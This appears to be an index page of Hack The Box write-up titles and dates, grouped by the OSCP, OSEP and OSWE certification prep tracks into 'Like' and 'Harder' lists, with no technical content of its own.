## HTB: Jerry 17 Nov 2018

## HTB: Bounty 27 Oct 2018

## HTB: TartarSauce 20 Oct 2018

## HTB: Sunday 29 Sep 2018

## HTB: Poison 08 Sep 2018

## HTB: Silo 04 Aug 2018

## HTB: Valentine 28 Jul 2018

## HTB: Nibbles 30 Jun 2018

## HTB: Chatterbox 18 Jun 2018

## HTB: Bashed 29 Apr 2018
OSCP Harder

## HTB: Jail 23 May 2022

## HTB: Jeeves 14 Apr 2022

## HTB: Tally 11 Apr 2022

## HTB: Kotarak 19 May 2021

## HTB: Control 25 Apr 2020

## HTB: Sniper 28 Mar 2020

## HTB: Bitlab 11 Jan 2020

## HTB: Safe 26 Oct 2019

## HTB: LaCasaDePapel 27 Jul 2019

## HTB: Netmon 29 Jun 2019

## HTB: Sizzle 01 Jun 2019

## HTB: Lightweight 11 May 2019

## HTB: October 26 Mar 2019

## HTB: Hawk 30 Nov 2018

## HTB: Bart 15 Jul 2018

## HTB: Falafel 23 Jun 2018

OSEP (PEN-300)
OSEP Like

## HTB: Escape 17 Jun 2023

## HTB: Absolute 27 May 2023

## HTB: Flight 06 May 2023

## HTB: Sekhmet 01 Apr 2023

## HTB: Support 17 Dec 2022

## HTB: Outdated 10 Dec 2022

## HTB: Hathor 19 Nov 2022

## HTB: Scrambled 01 Oct 2022

## HTB: StreamIO 17 Sep 2022

## HTB: Timelapse 20 Aug 2022

## HTB: Forge 22 Jan 2022

## HTB: Seal 13 Nov 2021

## HTB: APT 10 Apr 2021

## HTB: Multimaster 19 Sep 2020

## HTB: Magic 22 Aug 2020

## HTB: Monteverde 13 Jun 2020

## HTB: OpenAdmin 02 May 2020

## HTB: Control 25 Apr 2020

## HTB: Forest 21 Mar 2020

## HTB: Querier 22 Jun 2019
OSEP Harder

## HTB: Absolute 27 May 2023

## HTB: Search 30 Apr 2022

## HTB: Anubis 29 Jan 2022

## HTB: PivotAPI 06 Nov 2021

## HTB: Monteverde 13 Jun 2020

## HTB: Sizzle 01 Jun 2019

OSWE (WEB-300)
OSWE Like

## HTB: Fingerprint 14 May 2022

## HTB: Fulcrum 11 May 2022

## HTB: Stacked 19 Mar 2022

## HTB: Monitors 09 Oct 2021

## HTB: Sink 18 Sep 2021

## HTB: Schooled 11 Sep 2021

## HTB: Unobtainium 04 Sep 2021

## HTB: Cereal 29 May 2021

## HTB: CrossFit 20 Mar 2021

## HTB: Magic 22 Aug 2020

## HTB: Blocky 30 Jun 2020

## HTB: Popcorn 23 Jun 2020

## HTB: Mango 18 Apr 2020

## HTB: Json 15 Feb 2020

## HTB: Unattended 24 Aug 2019

## HTB: Help 08 Jun 2019

## HTB: Vault 06 Apr 2019

## HTB: Zipper 23 Feb 2019

## HTB: Celestial 25 Aug 2018

## HTB: Falafel 23 Jun 2018
OSWE Harder

## HTB: Holiday 11 Sep 2019

## HTB: Arkham 10 Aug 2019

## HTB: Hackback 06 Jul 2019
